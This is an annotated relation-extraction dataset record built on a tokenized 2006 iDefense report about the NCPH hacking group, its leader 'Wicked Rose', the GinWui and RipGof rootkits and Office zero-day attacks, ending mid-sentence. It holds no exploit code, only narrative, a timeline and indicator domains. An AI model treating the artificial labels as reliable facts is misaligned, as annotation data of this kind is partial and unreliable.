[[{"vertexSet": [{"old_id": "T1", "type": "Exploit", "name": "Zero-day", "sent_id": 2, "pos": [0]}, {"old_id": "T2", "type": "Organization", "name": "VeriSign iDefense", "sent_id": 6, "pos": [2, 3]}, {"old_id": "T3", "type": "AttackerGroup", "name": "NCPH", "sent_id": 7, "pos": [16]}, {"old_id": "T4", "type": "Time", "name": "2006", "sent_id": 8, "pos": [15]}, {"old_id": "T5", "type": "Attacker", "name": "Wicked Rose", "sent_id": 7, "pos": [9, 10]}, {"old_id": "T6", "type": "Attacker", "name": "KuNgBiM", "sent_id": 18, "pos": [0]}, {"old_id": "T7", "type": "Attacker", "name": "Rodag", "sent_id": 19, "pos": [0]}, {"old_id": "T8", "type": "Attacker", "name": "Charles", "sent_id": 20, "pos": [0]}, {"old_id": "T9", "type": "Vulnerability", "name": "Microsoft Word Malformed OLE Structure Code Execution", "sent_id": 27, "pos": [1, 7]}, {"old_id": "T10", "type": "Vulnerability", "name": "Microsoft Excel Malformed BIFF Structure Code Execution", "sent_id": 27, "pos": [1, 7]}, {"old_id": "T11", "type": "Organization", "name": "Internet Storm Center", "sent_id": 31, "pos": []}, {"old_id": "T12", "type": "Organization", "name": "SANS", "sent_id": 32, "pos": [13]}, {"old_id": "T13", "type": "Organization", "name": "iDefense", "sent_id": 32, "pos": [9]}, {"old_id": "T14", "type": "MalwareFamily", "name": "GinWui", "sent_id": 35, "pos": [3]}, {"old_id": "T15", "type": "Software", "name": "Microsoft Word 2002", "sent_id": 41, "pos": [6, 8]}, {"old_id": "T16", "type": "Time", "name": "May 12 2006", "sent_id": 42, "pos": [3, 6]}, {"old_id": "T17", "type": "Attacker", "name": "Wicked Rose", "sent_id": 46, "pos": []}, {"old_id": "T18", "type": "Country", "name": "United States", "sent_id": 43, "pos": [11, 12]}, {"old_id": "T19", "type": "Country", "name": "Japan", "sent_id": 44, "pos": [2]}, {"old_id": "T20", "type": "Malware", "name": "GinWuiA", "sent_id": 45, "pos": []}, {"old_id": "T21", "type": "Malware", "name": "GinWuiB", "sent_id": 45, "pos": []}, {"old_id": "T22", "type": "Indicator", "name": "neasenet", "sent_id": 53, "pos": []}, {"old_id": "T23", "type": "File", "name": "Planning document 5-16-2006doc", "sent_id": 62, "pos": []}, {"old_id": "T24", "type": "Time", "name": "May 17 2006", "sent_id": 65, "pos": [5, 8]}, {"old_id": "T25", "type": "Payload", "name": "GinWui", "sent_id": 69, "pos": [1]}, {"old_id": "T26", "type": "TrojanHorse", "name": "GinWui", "sent_id": 70, "pos": [11]}, {"old_id": "T27", "type": "TrojanHorse", "name": "winguisdll", "sent_id": 71, "pos": []}, {"old_id": "T28", "type": "Attacker", "name": "Wicked Rose", "sent_id": 75, "pos": [0, 1]}, {"old_id": "T29", "type": "Malware", "name": "GinWui", "sent_id": 75, "pos": [7]}, {"old_id": "T30", "type": "Organization", "name": "WHG", "sent_id": 77, "pos": [2]}, {"old_id": "T31", "type": "Time", "name": "June 21 2006", "sent_id": 89, "pos": [3, 6]}, {"old_id": "T32", "type": "Attacker", "name": "Wicked Rose", "sent_id": 84, "pos": [6, 7]}, {"old_id": "T33", "type": "Attacker", "name": "RipGof", "sent_id": 95, "pos": [0]}, {"old_id": "T34", "type": "Time", "name": "June 2006", "sent_id": 98, "pos": [1, 2]}, {"old_id": "T35", "type": "TrojanHorse", "name": "RipGofB", "sent_id": 99, "pos": []}, {"old_id": "T36", "type": "Vulnerability", "name": "MS06-027", "sent_id": 99, "pos": [8]}, {"old_id": "T37", "type": "TrojanHorse", "name": "RipGofB", "sent_id": 99, "pos": []}, {"old_id": "T38", "type": "Indicator", "name": "enjoyirdetcom", "sent_id": 107, "pos": []}, {"old_id": "T39", "type": "Indicator", "name": "enjoybmwseecom", "sent_id": 107, "pos": []}, {"old_id": "T40", "type": "TrojanHorse", "name": "RipGofB", "sent_id": 107, "pos": []}, {"old_id": "T41", "type": "TrojanHorse", "name": "RipGofA", "sent_id": 111, "pos": []}, {"old_id": "T42", "type": "ExploitTargetObject", "name": "Jet Engine Database", "sent_id": 112, "pos": [15, 17]}, {"old_id": "T43", "type": "TrojanHorse", "name": "RipGofA", "sent_id": 112, "pos": []}, {"old_id": "T44", "type": "Time", "name": "March 2005", "sent_id": 113, "pos": [0, 1]}, {"old_id": "T45", "type": "Attacker", "name": "RipGof", "sent_id": 113, "pos": [12]}, {"old_id": "T46", "type": "Attacker", "name": "Evil Security Team", "sent_id": 126, "pos": []}, {"old_id": "T47", "type": "GeneralVirus", "name": "Dasher", "sent_id": 127, "pos": [10]}, {"old_id": "T48", "type": "TrojanHorse", "name": "PcShares", "sent_id": 127, "pos": [15]}, {"old_id": "T49", "type": "Time", "name": "April 22 2005", "sent_id": 133, "pos": [0, 3]}, {"old_id": "T50", "type": "Time", "name": "Dec 19 2005", "sent_id": 134, "pos": [0, 4]}, {"old_id": "T51", "type": "Time", "name": "April 27 2006", "sent_id": 135, "pos": [0, 3]}, {"old_id": "T52", "type": "Time", "name": "April 30 2006", "sent_id": 136, "pos": [0, 3]}, {"old_id": "T53", "type": "Time", "name": "May 2 2006", "sent_id": 137, "pos": [0, 3]}, {"old_id": "T54", "type": "Time", "name": "May 12 2006", "sent_id": 138, "pos": [0, 3]}, {"old_id": "T55", "type": "Time", "name": "May 15 2006", "sent_id": 139, "pos": [0, 3]}, {"old_id": "T56", "type": "Time", "name": "May 16 2006", "sent_id": 140, "pos": [0, 3]}, {"old_id": "T57", "type": "Time", "name": "May 16 2006", "sent_id": 141, "pos": [0, 3]}, {"old_id": "T58", "type": "Time", "name": "May 18 2006", "sent_id": 142, "pos": [0, 3]}, {"old_id": "T59", "type": "Time", "name": "May 19 2006", "sent_id": 143, "pos": [0, 3]}, {"old_id": "T60", "type": "Time", "name": "May 20 2006", "sent_id": 144, "pos": [0, 3]}, {"old_id": "T61", "type": "Time", "name": "May 20 2006", "sent_id": 145, "pos": [0, 3]}, {"old_id": "T62", "type": "Time", "name": "May 29 2006", "sent_id": 146, "pos": [0, 3]}, {"old_id": "T63", "type": "Time", "name": "June 1 2006", "sent_id": 147, "pos": [0, 3]}, {"old_id": "T64", "type": "Time", "name": "June 9 2006", "sent_id": 148, "pos": [0, 3]}, {"old_id": "T65", "type": "Time", "name": "June 14 2006", "sent_id": 149, "pos": [0, 3]}, {"old_id": "T66", "type": "Time", "name": "June 15 2006", "sent_id": 150, "pos": [0, 3]}, {"old_id": "T67", "type": "Time", "name": "June 15 2006", "sent_id": 151, "pos": [0, 3]}, {"old_id": "T68", "type": "Time", "name": "June 16 2006", "sent_id": 152, "pos": [0, 3]}, {"old_id": "T69", "type": "Time", "name": "June 18 2006", "sent_id": 153, "pos": [0, 3]}, {"old_id": "T70", "type": "Time", "name": "June 23 2006", "sent_id": 154, "pos": [0, 3]}, {"old_id": "T71", "type": "Time", "name": "June 23 2006", "sent_id": 155, "pos": [0, 3]}, {"old_id": "T72", "type": "Time", "name": "June 25 2006", "sent_id": 156, "pos": [0, 3]}, {"old_id": "T73", "type": "Time", "name": "June 26 2006", "sent_id": 157, "pos": [0, 3]}, {"old_id": "T74", "type": "Time", "name": "Sept 27 2006", "sent_id": 158, "pos": [0, 4]}, {"old_id": "T75", "type": "Time", "name": "Sept 30 2006", "sent_id": 159, "pos": [0, 4]}, {"old_id": "T76", "type": "Time", "name": "Oct 9 2006", "sent_id": 160, "pos": [0, 4]}, {"old_id": "T77", "type": "Time", "name": "September 7", "sent_id": 160, "pos": []}, {"old_id": "T78", "type": "Malware", "name": "RipGofA", "sent_id": 133, "pos": []}, {"old_id": "T79", "type": "GeneralVirus", "name": "Dasher", "sent_id": 134, "pos": [6]}, {"old_id": "T80", "type": "TrojanHorse", "name": "PcShare", "sent_id": 134, "pos": [9]}, {"old_id": "T81", "type": "Attacker", "name": "Evil Security Team", "sent_id": 134, "pos": [13, 15]}, {"old_id": "T82", "type": "TrojanHorse", "name": "GinWuiA", "sent_id": 138, "pos": []}, {"old_id": "T83", "type": "TrojanHorse", "name": "GinWuiA", "sent_id": 141, "pos": []}, {"old_id": "T84", "type": "TrojanHorse", "name": "GinWuiB", "sent_id": 144, "pos": []}, {"old_id": "T85", "type": "TrojanHorse", "name": "GinWuiC", "sent_id": 146, "pos": []}, {"old_id": "T86", "type": "Dropper", "name": "MdropperF", "sent_id": 148, "pos": []}, {"old_id": "T87", "type": "Malware", "name": "DaserfA", "sent_id": 149, "pos": []}, {"old_id": "T88", "type": "Dropper", "name": "MdropperG", "sent_id": 150, "pos": []}, {"old_id": "T89", "type": "TrojanHorse", "name": "BooliA Trojan", "sent_id": 151, "pos": []}, {"old_id": "T90", "type": "Malware", "name": "FluxE", "sent_id": 152, "pos": []}, {"old_id": "T91", "type": "Malware", "name": "RipGofB", "sent_id": 153, "pos": []}, {"old_id": "T92", "type": "Dropper", "name": "PPDropperA", "sent_id": 154, "pos": []}, {"old_id": "T93", "type": "TrojanHorse", "name": "BooliB Trojan", "sent_id": 155, "pos": []}, {"old_id": "T94", "type": "Malware", "name": "GinWuiD", "sent_id": 156, "pos": []}, {"old_id": "T95", "type": "Malware", "name": "GinWuiE", "sent_id": 157, "pos": []}, {"old_id": "T96", "type": "Dropper", "name": "PPDropperF", "sent_id": 158, "pos": []}, {"old_id": "T97", "type": "Malware", "name": "GinWuiG", "sent_id": 159, "pos": []}, {"old_id": "T98", "type": "Attacker", "name": "MeiGui HeiKe", "sent_id": 169, "pos": []}, {"old_id": "T99", "type": "Indicator", "name": "wwwmghackercom", "sent_id": 170, "pos": []}, {"old_id": "T100", "type": "Attacker", "name": "WHG", "sent_id": 213, "pos": [0]}, {"old_id": "T101", "type": "MalwareFamily", "name": "GinWui", "sent_id": 214, "pos": [9]}, {"old_id": "T102", "type": "Email", "name": "ncph2005@126com", "sent_id": 185, "pos": []}, {"old_id": "T103", "type": "Location", "name": "Zigong Sichuan Province", "sent_id": 187, "pos": [9, 12]}, {"old_id": "T104", "type": "Country", "name": "China", "sent_id": 187, "pos": [16]}, {"old_id": "T105", "type": "Email", "name": "whg@163com", "sent_id": 227, "pos": []}, {"old_id": "T106", "type": "Attacker", "name": "WZT", "sent_id": 233, "pos": [0]}, {"old_id": "T107", "type": "AttackerGroup", "name": "NCPH", "sent_id": 233, "pos": [7]}, {"old_id": "T108", "type": "AttackerGroup", "name": "NCPH", "sent_id": 213, "pos": [7]}, {"old_id": "T109", "type": "Indicator", "name": "tthackercublogcn", "sent_id": 240, "pos": []}, {"old_id": "T110", "type": "Indicator", "name": "windowsupdatesnet", "sent_id": 243, "pos": []}, {"old_id": "T111", "type": "Location", "name": "Jiangsu", "sent_id": 245, "pos": [7]}, {"old_id": "T112", "type": "Location", "name": "Sichuan", "sent_id": 245, "pos": [10]}, {"old_id": "T113", "type": "Organization", "name": "WHOIS", "sent_id": 242, "pos": [0]}], "labels": [{"old_id": "R1", "r": "P3", "h": 4, "t": 2, "evidence": [7]}, {"old_id": "R2", "r": "P33", "h": 4, "t": 3, "evidence": [7, 8]}, {"old_id": "R3", "r": "P33", "h": 16, "t": 15, "evidence": []}, {"old_id": "R4", "r": "P14", "h": 19, "t": 13, "evidence": []}, {"old_id": "R5", "r": "P14", "h": 20, "t": 13, "evidence": []}, {"old_id": "R6", "r": "P2", "h": 27, "t": 28, "evidence": [75]}, {"old_id": "R7", "r": "P33", "h": 31, "t": 30, "evidence": [84, 85, 86, 87, 88, 89]}, {"old_id": "R8", "r": "P23", "h": 27, "t": 26, "evidence": []}, {"old_id": "R9", "r": "P23", "h": 27, "t": 25, "evidence": []}, {"old_id": "R10", "r": "P33", "h": 32, "t": 33, "evidence": [95, 96, 97, 98]}, {"old_id": "R11", "r": "P2", "h": 32, "t": 34, "evidence": [95, 96, 97, 98, 99]}, {"old_id": "R12", "r": "P21", "h": 37, "t": 39, "evidence": [107]}, {"old_id": "R13", "r": "P21", "h": 38, "t": 39, "evidence": [107]}, {"old_id": "R14", "r": "P33", "h": 44, "t": 43, "evidence": [113]}, {"old_id": "R15", "r": "P23", "h": 45, "t": 46, "evidence": [126, 127]}, {"old_id": "R16", "r": "P23", "h": 45, "t": 47, "evidence": [126, 127]}, {"old_id": "R17", "r": "P33", "h": 77, "t": 48, "evidence": [133]}, {"old_id": "R18", "r": "P33", "h": 78, "t": 49, "evidence": [134]}, {"old_id": "R19", "r": "P33", "h": 79, "t": 49, "evidence": [134]}, {"old_id": "R20", "r": "P33", "h": 80, "t": 49, "evidence": [134]}, {"old_id": "R21", "r": "P23", "h": 80, "t": 78, "evidence": [134]}, {"old_id": "R22", "r": "P23", "h": 80, "t": 79, "evidence": [134]}, {"old_id": "R23", "r": "P33", "h": 81, "t": 53, "evidence": [138]}, {"old_id": "R24", "r": "P33", "h": 82, "t": 56, "evidence": [141]}, {"old_id": "R25", "r": "P33", "h": 83, "t": 59, "evidence": [144]}, {"old_id": "R26", "r": "P33", "h": 84, "t": 61, "evidence": [146]}, {"old_id": "R27", "r": "P33", "h": 85, "t": 63, "evidence": [148]}, {"old_id": "R28", "r": "P33", "h": 86, "t": 64, "evidence": [149]}, {"old_id": "R29", "r": "P33", "h": 87, "t": 65, "evidence": [150]}, {"old_id": "R30", "r": "P33", "h": 88, "t": 66, "evidence": [151]}, {"old_id": "R31", "r": "P33", "h": 89, "t": 67, "evidence": [152]}, {"old_id": "R32", "r": "P33", "h": 90, "t": 68, "evidence": [153]}, {"old_id": "R33", "r": "P33", "h": 91, "t": 69, "evidence": [154]}, {"old_id": "R34", "r": "P33", "h": 92, "t": 70, "evidence": [155]}, {"old_id": "R35", "r": "P33", "h": 93, "t": 71, "evidence": [156]}, {"old_id": "R36", "r": "P33", "h": 94, "t": 72, "evidence": [157]}, {"old_id": "R37", "r": "P33", "h": 95, "t": 73, "evidence": [158]}, {"old_id": "R38", "r": "P33", "h": 96, "t": 74, "evidence": [159]}, {"old_id": "R39", "r": "P3", "h": 105, "t": 106, "evidence": [233]}, {"old_id": "R40", "r": "P3", "h": 99, "t": 107, "evidence": [213]}], "title": ["inputs/txt/201211DunhamWickedRose"], "sents": [["\"Wicked", "Rose\"", "and", "the", "NCPH", "Hacking", "Group"], ["by", "Ken", "Dunham", "&", "Jim", "Melnick"], ["Zero-day", "attacks", ",", "where", "an", "attack", "occurs", "before", "public", "knowledge", "of", "a", "vulnerability", "is", "known", ",", "is"], ["a", "growing", "cause", "of", "concern", "for", "security", "professionals", "in", "the", "21st", "century", ".", "An", "unprecedented"], ["number", "of", "zero-day", "attacks", "took", "place", "in", "2006", ",", "largely", "involving", "Microsoft", "Office", "Files", ".", "Ken"], ["Dunham", ",", "Director", "of", "the", "Rapid", "Response", "Team", ",", "and", "Jim", "Melnick", ",", "Director", "of", "Threat", "Operations", ","], ["led", "the", "VeriSign", "iDefense", "intelligence", "team", "to", "track", "down", "Chinese", "hackers", "for", "hire", "out", "of", "China", ","], ["responsible", "for", "many", "of", "the", "attacks", "in", "2006", ".", "Wicked", "Rose", "is", "the", "ring-leader", "of", "the", "NCPH"], ["hacking", "group", "and", "this", "is", "the", "story", "of", "their", "maturation", "into", "significant", "global", "threat", "by", "2006", "."], ["1"], ["Introduction", "to", "N", ".", "C.P.H."], ["N", ".", "C.P.H.", "(Network", "Crack", "Program", "Hacker)", "has", "about", "ten", "members", "or", "associates", ".", "Four", "core"], ["members", "exist", "as", "of", "2006:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["(Wicked)", "Rose"], ["KuNgBiM"], ["Rodag"], ["Charles"], ["There", "are", "also", "some", "six", "other", "associates", "within", "NCPH", "and", "two", "other", "positions", "(possibly", "unfilled"], ["positions)", "whose", "purpose", "is", "unclear", ".", "However", ",", "\u201cRose\u201d", "or", "\u201cWicked", "Rose\u201d", "seems", "to", "be", "the"], ["primary", "leader", ".", "Membership", "rules", ",", "recruiting", "goals", "and", "standards", "are", "unknown", ".", "However", ",", "some"], ["members", "appear", "to", "be", "current", "or", "former", "students", "of", "Sichuan", "University", "of", "Science", "and"], ["Engineering", ".", "1"], ["The", "group", "is", "responsible", "for", "development", "and", "deployment", "of", "exploit", "codes", "related", "vulnerabilities"], ["in", "Microsoft", "Word", "Malformed", "OLE", "Structure", "Code", "Execution", "and", "Microsoft", "Excel", "Malformed"], ["BIFF", "Structure", "Code", "Execution", "."], ["2"], ["Public", "Knowledge", "of", "a", "Zero-Day", "Word", "Exploit"], ["The", "story", "of", "NCPH", "zero-day", "attacks", "begins", "publicly", "on", "May", "18", ",", "2006", ".", "On", "this", "day", "the", "Internet"], ["Storm", "Center", "reports", "a", "new", "possible", "zero-day", "attack", ".", "iDefense", "worked", "closely", "with", "SANS", "and"], ["other", "organizations", "to", "analyze", "the", "threat", "landscape", "as", "it", "related", "to", "exploitation", "of", "this"], ["vulnerability", ".", "Within", "the", "next", "36", "hours", ",", "iDefense", "gained", "access", "to", "multiple", "codes", "and", "extracted", "a"], ["new", "rootkit", "called", "GinWui", ".", "Independent", "research", "proved", "the", "following:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["1"], ["Exploitation", "targeted", "a", "new", "vulnerability", "that", "allowed", "attackers", "to", "successfully", "exploit"], ["computers", "running", "fully", "patched", "versions", "of", "Microsoft", "Word", "2002", "and", "others", "."], ["Exploitation", "dated", "to", "May", "12", ",", "2006", "and", "involved", "at", "least", "six", "unique", "hostile", "exploit", "files", "."], ["iDefense", "confirmed", "that", "attacks", "targeted", "two", "organizations", ",", "one", "in", "the", "United", "States", "and"], ["one", "in", "Japan", "."], ["Chinese-authored", "rootkits", "GinWui", ".", "A", "and", "GinWui", ".", "B", "exist", "in", "several", "attacks", ".", "iDefense"], ["identified", "the", "rootkits'", "source", "and", "authors", "as", "Chinese", "actor", "\"Wicked", "Rose\"", "and", "others"], ["profiled", "later", "in", "this", "report", "."], ["www", ".", "suse.edu.cn", "&", "http://www", ".", "study-in-china.org/school/Sichuan/suse/"], ["\uf0b7"], ["\uf0b7"], ["Successful", "installation", "of", "the", "rootkit", "requires", "Administrator", "or", "Debugger", "rights", ".", "Initial"], ["exploitation", ",", "however", ",", "does", "not", "require", "Administrator", "rights", "."], ["iDefense", "identified", "unique", "malicious", "code", "attacks", "pointing", "to", "nease", ".", "net", "and", "authored"], ["several", "Snort", "signatures", "for", "this", "traffic", ".", "iDefense", "continues", "to", "monitor", "other", "domains"], ["related", "to", "the", "attack", "."], ["The", "original", "attack", "upon", "a", "large", "DoD", "entity", "within", "the", "USA", "began", "on", "May", "12", ",", "2006", ".", "Targets", "of"], ["the", "attacker", "were", "apparently", "\"Googled\"", "by", "the", "attacker", ".", "Three", "variations", "of", "a", "Microsoft", "Word"], ["zero-day", "attack", "are", "involved", "in", "the", "attack", ".", "A", "few", "dozen", "attack", "files", "are", "first", "distributed", "to", "less"], ["than", "a", "dozen", "targets", "to", "identify", "which", "version", "works", "within", "the", "organization", "."], ["Once", "attackers", "identify", "the", "vulnerable", "version", "of", "Microsoft", "Word", "used", "within", "the", "organization"], ["close", "to", "200", "messages", "sent", "out", "to", "multiple", "targets", "within", "the", "organization", "within", "24", "hours", ".", "This"], ["second", "wave", "of", "attack", "is", "distributed", "as", "\"Planning", "document", "5-16-2006", ".", "doc\".", "This", "code", "is"], ["improved", "beyond", "the", "first", "variant", "sent", "out", "earlier", "to", "identify", "the", "vulnerable", "version", "of", "Word"], ["within", "the", "targeted", "network", "."], ["A", "third", "attack", "commences", "on", "May", "17", ",", "2006", ".", "During", "this", "period", ",", "the", "Internet", "Storm", "Center", "and"], ["others", "get", "involved", "and", "the", "case", "becomes", "public", ".", "In", "the", "end", ",", "iDefense", "identified", "six", "unique"], ["samples", ",", "of", "which", "three", "are", "more", "prevalent", "than", "other", "variants", "."], ["3"], ["The", "GinWui", "Backdoor", "Rootkit", "Payload"], ["Zero", "day", "attacks", "commenced", "in", "May", "2006", "attempted", "to", "install", "a", "GinWui", "backdoor", "Trojan", "horse"], ["and", "Windows", "rootkit", ".", "A", "DLL", "file", "called", "winguis", ".", "dll", "and", "several", "SYS", "files", "install", "themselves"], ["when", "a", "computer", "is", "successfully", "attacked", "through", "an", "exploit", ".", "Two", "versions", "of", "the", "GinWui"], ["rootkit", "are", "installed", "during", "several", "attacks", "in", "May", "and", "June", "2006", "."], ["NCHP", "5", ".", "0", "Screenshot", "(GinWui", "Rootkit)"], ["Wicked", "Rose", "is", "the", "author", "of", "the", "GinWui", "malicious", "code", ".", "His", "code", "and", "support", "posts", "related", "to"], ["GinWui", "distributions", "exist", "on", "the", "Chinese", "NCPH", "and", "Evil", "Octal", "forums", ".", "Wicked", "Rose"], ["associates", "with", "WHG", "and", "others", "on", "this", "form", ".", "WHT", "hosted", "version", "\"3", ".", "0beta.3\"", "of", "the", "\"NCPH"], ["remote", "control\"", "rootkit", "code", "on", "May", "2", ",", "2006", ".", "This", "distribution", "of", "GinWui", "was", "largely", "unknown"], ["and", "undetected", "by", "anti-virus", "companies", "at", "the", "time", "of", "release", "."], ["Versions", "of", "GinWui", "used", "in", "targeted", "attacks", "of", "May", "and", "June", "2006", "are", "private", "versions", ",", "not"], ["released", "to", "the", "public", ".", "This", "proves", "that", "Wicked", "Rose", "either", "constructed", "the", "zero", "day", "attacks", "or"], ["sold", "private", "code", "to", "users", "that", "performed", "the", "attack", "."], ["Wicked", "Rose", "later", "documents", "additional", "updates", "to", "his", "rootkit", "code", ",", "version", "", ".", "50,", "at"], ["http://rodag", ".", "blogbus.com/index.html.", "By", "this", "time", "Wicked", "Rose", "was", "performing", "full-time"], ["development", "of", "this", "malicious", "code", "as", "a", "hacker", "for", "hire", "."], ["4"], ["June", "21", ",", "2007", "\u2013", "Continued", "US", "Targeted", "Attacks"], ["Just", "over", "a", "month", "later", ",", "following", "initial", "GinWui", "based", "targeted", "attacks", ",", "another", "Microsoft", "Word"], ["exploit", "occurs", "on", "June", "21", ",", "2006", ".", "A", "spoofed", "e-mail", "is", "sent", "to", "a", "target", "containing", "a", "hostile"], ["Microsoft", "Word", "document", ".", "Analysis", "of", "the", "attack", "reveals", "that", "it's", "likely", "a", "test", "file", "used", "to"], ["identify", "what", "version", "of", "Word", "may", "be", "running", "within", "the", "targeted", "organization", ",", "rather", "than", "a"], ["refined", "targeted", "attack", "upon", "a", "known", "version", "of", "Microsoft", "Word", ".", "Chinese", "text", "within", "the", "Word"], ["document", "reveal", "Chinese", "characters", "discussing", "a", "systematic", "evaluation", "of", "offsets", "for", "Microsoft"], ["Word", "exploitation:"], ["RipGof", "attacks", "reveal", "a", "Chinese", "string", "related", "to", "systematic", "testing", "of", "offsets", "for", "exploitation", "."], ["5"], ["Backtracking", "Targeted", "Attacks:", "RipGof"], ["In", "June", "2006", "another", "targeted", "attack", "emerges", ",", "but", "it's", "not", "GinWui", "this", "time", "but", "a", "new", "code", ","], ["RipGof", ".", "B.", "The", "attack", "attempts", "to", "exploit", "MS06-027", "to", "install", "RipGof", ".", "B,", "a", "Trojan", "horse", ".", "This", "is"], ["the", "same", "exploit", "code", "used", "in", "the", "former", "Zero-Day", "attacks", "linked", "to", "Wicked", "Rose", "and", "the", "NCPH"], ["hacking", "group", ".", "The", "exploit", "code", "is", "still", "private", "at", "this", "time", ",", "proving", "that", "the", "author", "of", "both"], ["GinWui", "and", "RipGof", "attacks", "are", "the", "same", "individual", "or", "group", "or", "affiliated", "through", "underground"], ["criminal", "operations", "."], ["RipGof", ".", "B", "is", "an", "improvement", "of", "the", "former", "exploit", "used", "in", "GinWui", "attacks", ".", "RipGof", ".", "B", "attacks"], ["included", "improvements", "to", "shellcode", "that", "attempts", "to", "fork", "to", "different", "locations", "based", "upon", "the"], ["address", "value", "of", "the", "stack", "to", "exploit", "multiple", "versions", "of", "Microsoft", "Word", ".", "Once", "installed", ","], ["RipGof", ".", "B", "attempts", "to", "connect", "to", "enjoy", ".", "irdet.com", "and", "enjoy", ".", "bmwsee.com", "over", "TCP", "port", "80", ".", "It"], ["runs", "as", "a", "rootkit", "and", "backdoor", "Trojan", "horse", "and", "phones", "home", "to", "a", "Chinese", "server", "with", "stolen"], ["data", "."], ["RipGof", "malicious", "code", "does", "not", "exist", "as", "a", "distribution", "in", "the", "underground", ",", "leading", "investigators"], ["to", "look", "into", "the", "original", "RipGof", ".", "A", "malicious", "code", ".", "Over", "a", "year", "prior", "to", "the", "2006", "targeted", "attacks"], ["RipGof", ".", "A", "emerges", "in", "the", "wild", ".", "RipGof", ".", "A", "attempted", "to", "exploit", "the", "Jet", "Engine", "Database", "exploit", "in"], ["March", "2005", ".", "This", "proves", "attempted", "exploitation", "and", "installation", "of", "code", "through", "RipGof", "for", "a"], ["year", "prior", "to", "more", "sophisticated", "codes", "and", "attacks", "."], ["In", "summary", ",", "RipGof", "and", "GinWui", "attacks", "both", "use", "the", "same", "private", "exploit", "code", "against"], ["Microsoft", "Word", "and", "both", "install", "rootkit", "based", "codes", "to", "steal", "and", "send", "information", "back", "to"], ["Chinese", "sources", ".", "This", "circumstantial", "evidence", "reveals", "that", "Wicked", "Rose", "and", "the", "NCPH", "group"], ["likely", "began", "their", "exploitation", "efforts", "at", "least", "a", "year", "and", "a", "half", "to", "two", "years", "prior", "to", "sophisticated"], ["attacks", "that", "commenced", "in", "2006", ".", "Once", "the", "group", "found", "a", "vulnerability", "within", "Microsoft", "Word"], ["they", "were", "able", "to", "improve", "upon", "it", "and", "their", "targeted", "attack", "techniques", "to", "distribute", "multiple"], ["targeted", "attacks", "and", "malicious", "codes", "for", "criminal", "gain", "as", "hackers", "for", "hire", "."], ["6"], ["Timeline", "of", "Events"], ["Wicked", "Rose", "and", "the", "NCPH", "hacking", "group", "are", "implicated", "in", "multiple", "Office", "based", "attacks", "over"], ["a", "two", "year", "period", ".", "An", "attack", "in", "2006", "used", "RipGof", ".", "B", "in", "the", "attack", ".", "RipGof", ".", "A", "first", "emerged", "a"], ["year", "earlier", "using", "an", "exploit", "that", "is", "relatively", "unsophisticated", ".", "Over", "the", "next", "year", "the", "Evil"], ["Security", "Team", ",", "also", "out", "of", "China", ",", "creates", "the", "Dasher", "worm", "and", "uses", "the", "PcShares", "Trojan", "in", "an"], ["attack", ".", "Wicked", "Rose", "gives", "a", "recommendation", "on", "the", "Trojan", "the", "day", "it", "is", "updated", "in", "the", "spring", "of"], ["2006", ",", "showing", "a", "close", "affiliation", "between", "Wicked", "Rose", "and", "the", "Evil", "Security", "Team", "actors", "."], ["Multiple", "attacks", "that", "take", "place", "in", "May", "and", "June", "and", "later", "2006", "are", "related", "to", "privately", "held"], ["exploit", "code", "for", "both", "Microsoft", "Word", "and", "Excel", ",", "proven", "to", "be", "developed", "by", "Wicked", "Rose", ".", "A"], ["timeline", "of", "proven", "associated", "events", "related", "to", "Wicked", "Rose", "attacks", "is", "below:"], ["April", "22", ",", "2005", "-", "RipGof", ".", "A", "JetEngine", "DB", "Attack"], ["Dec", ".", "19", ",", "2005", "\u2013", "Dasher", "worm", "and", "PcShare", "Trojan", "attack", "by", "Evil", "Security", "Team"], ["April", "27", ",", "2006", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["April", "30", ",", "2006", "-", "Wicked", "Rose", "Drops", "out", "of", "School"], ["May", "2", ",", "2006", "\u2013", "3", ".", "0beta3", "NCPH", "remote", "control", "(GinWui)", "public", "release"], ["May", "12", ",", "2006", "-", "Initial", "probing", "and", "GinWui", ".", "A", "exploitation", "attempts", "against", "US", "target"], ["May", "15", ",", "2006", "-", "PcShare", "Trojan", "update", "recommended", "by", "Wicked", "Rose", "on", "day", "of", "new", "release"], ["May", "16", ",", "2006", "-", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["May", "16", ",", "2006", "-", "Multiple", "GinWui", ".", "A", "attacks", "against", "US", "target"], ["May", "18", ",", "2006", "-", "SANS", "reports", "zero-day", "attack"], ["May", "19", ",", "2006", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["May", "20", ",", "2006", "-", "GinWui", ".", "B", "Attack"], ["May", "20", ",", "2006", "-", "WZT", "Kicked", "out", "of", "NCPH"], ["May", "29", ",", "2006", "-", "GinWui", ".", "C", "Attack"], ["June", "1", ",", "2006", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["June", "9", ",", "2006", "\u2013", "Mdropper", ".", "F", "Attack"], ["June", "14", ",", "2006", "\u2013", "Daserf", ".", "A", "Attack"], ["June", "15", ",", "2006", "\u2013", "Mdropper", ".", "G", "Attack"], ["June", "15", ",", "2006", "\u2013", "Booli", ".", "A", "Trojan", "Attack"], ["June", "16", ",", "2006", "-", "Flux", ".", "E", "Attack"], ["June", "18", ",", "2006", "-", "RipGof", ".", "B", "Attack"], ["June", "23", ",", "2006", "\u2013", "PPDropper", ".", "A"], ["June", "23", ",", "2006", "\u2013", "Booli", ".", "B", "Trojan", "attack"], ["June", "25", ",", "2006", "-", "GinWui", ".", "D", "Attack"], ["June", "26", ",", "2006", "-", "GinWui", ".", "E", "Attack"], ["Sept", ".", "27", ",", "2006", "\u2013", "PPDropper", ".", "F", "Attack"], ["Sept", ".", "30", ",", "2006", "\u2013", "GinWui", ".", "G", "Attack"], ["Oct", ".", "9", ",", "2006", "\u2013", "Wicked", "Rose", "reports", "pay", "increase;", "likely", "in", "September"], ["7"], ["A", "Pictorial", "Introduction", "to", "Wicked", "Rose", "and", "NCPH"], ["Just", "who", "are", "Wicked", "Rose", "and", "the", "NCPH", "hacker", "group", "?", "As", "it", "turns", "out", ",", "a", "collection", "of", "college"], ["students", "in", "China", "who", "likely", "room", "with", "one", "another", "and", "regularly", "support", "their", "hacking", "interests", "."], ["In-depth", "research", "implicates", "Wicked", "Rose", "as", "the", "ring-leader", "of", "the", "group", ",", "responsible", "for"], ["managing", "hacker", "for", "hire", "relationships", "and", 